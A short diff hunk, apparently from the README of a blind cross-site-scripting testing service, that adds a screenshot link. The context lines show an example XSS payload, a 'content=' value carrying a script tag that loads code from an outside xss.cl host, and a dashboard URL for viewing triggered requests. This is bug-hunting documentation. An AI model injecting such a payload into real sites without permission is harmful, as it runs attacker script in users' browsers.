@@ -43,3 +43,6 @@ content=testhello<script src="https://request-id-domain.xss.cl"></script>
 # Where to view the request that triggered the payload
 
 https://xss.bughunter.app/dashboard/trigger
+
+<img width="1330" alt="image" src="https://user-images.githubusercontent.com/16237562/215695198-fd570376-050a-43dc-b4f4-4a604335c1f0.png">
+
